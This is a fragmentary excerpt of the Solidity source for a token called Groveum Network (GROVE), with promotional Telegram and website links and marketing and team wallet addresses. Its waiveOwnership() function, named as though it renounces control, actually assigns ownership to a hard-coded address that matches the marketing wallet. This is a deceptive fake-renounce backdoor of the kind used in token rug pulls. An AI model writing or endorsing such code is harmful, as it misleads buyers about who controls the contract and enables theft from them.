...
UNIQUE BLOCKCHAIN FOR DEVELOPER

Telegram https://t.me/groveumnetwork
Website https://groveum-network.com
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x0533796d008cb345965A703e17e9199B5EED2660);
    }
...
contract GroveumNetwork is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Groveum Network";
    string private _symbol = "GROVE";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x0533796d008cb345965A703e17e9199B5EED2660);
    address payable public teamWalletAddress = payable(0x2168afc832ff27E58811CA771f4af7F67de0f61e);
